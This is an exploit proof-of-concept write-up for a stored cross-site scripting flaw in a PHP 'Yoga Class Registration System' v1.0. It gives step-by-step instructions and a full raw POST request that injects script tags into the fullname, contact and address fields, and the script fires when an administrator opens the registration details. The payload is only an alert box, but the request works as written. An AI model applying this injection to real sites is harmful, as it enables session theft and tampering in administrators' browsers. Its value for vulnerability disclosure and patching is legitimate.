# Exploit Title: Yoga Classes Registration System - XSS

### Date: 
> April 14, 2023

### Author: 
> tht1997
### Vendor Homepage:
> https://www.sourcecodester.com

### Software Link:
> [Yoga Class Registration System](https://www.sourcecodester.com/php/15371/auto-dealer-management-system-phpoop-free-source-code.html](https://www.sourcecodester.com/php/16097/yoga-class-registration-system-php-and-mysql-free-source-code.html))
### Version:
> v 1.0

### Proof of Concept:
Step 1. Go to a classes view and click on button register
Step 2. Full info with payload XSS into some field
\
![Example Image](https://drive.google.com/uc?id=1oJmlpkRQfwT0yD8n8NozI_L5Y7cv4Zwc)


Param: address is is the parameter that creates the vulnerability

```
POST /php-ycrs/classes/Master.php?f=save_registration HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------214398526911988890724243021391
Content-Length: 1117
Origin: http://localhost
Connection: close
Referer: http://localhost/php-ycrs/?p=yclasses/registration&cid=2
Cookie: eid=1; remember_me_name=bMGFrQaFzDhuoLmztZCT; remember_me_pwd=YMSm3Q2wFDHaHLQ5eZPKc42oU7CaK8IlA%40q1; remember_me_lang=en; Hm_lvt_c790ac2bdc2f385757ecd0183206108d=1680329430; Hm_lvt_5320b69f4f1caa9328dfada73c8e6a75=1680329567; table-page-size=50; PowerBB_username=xss; PowerBB_password=8879f85d0170cba2a4328bbb5a457c6a; menu_contracted=false; PHPSESSID=e67hpqdmcqi2k65669nv8cagm3
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------214398526911988890724243021391
Content-Disposition: form-data; name="id"


-----------------------------214398526911988890724243021391
Content-Disposition: form-data; name="class_id"

2
-----------------------------214398526911988890724243021391
Content-Disposition: form-data; name="fullname"

Tuan"><script>alert('THT1997')</script>
-----------------------------214398526911988890724243021391
Content-Disposition: form-data; name="email"

huutuan@email.com
-----------------------------214398526911988890724243021391
Content-Disposition: form-data; name="dob"

1997-12-10
-----------------------------214398526911988890724243021391
Content-Disposition: form-data; name="sex"

Male
-----------------------------214398526911988890724243021391
Content-Disposition: form-data; name="contact"

adminTuan"><script>alert('THT1997-2')</script>
-----------------------------214398526911988890724243021391
Content-Disposition: form-data; name="address"

adminTuan"><script>alert('THT1997-3')</script>
-----------------------------214398526911988890724243021391--

```

Step 3. Login to admin panel and view List of Registration Requests

Step 4. Click view detail register from Action button

Step 5. Alert XSS was show
\
![Example Image](https://drive.google.com/uc?id=1jUpq95JHtmCR3JGgA5UNucLB1-l5Dfwc)


Video POC:
[PoC Here](https://drive.google.com/file/d/1yQqza7Zs6yM_qt2KTOfekNgl94dnQ0B3/view?usp=sharing)

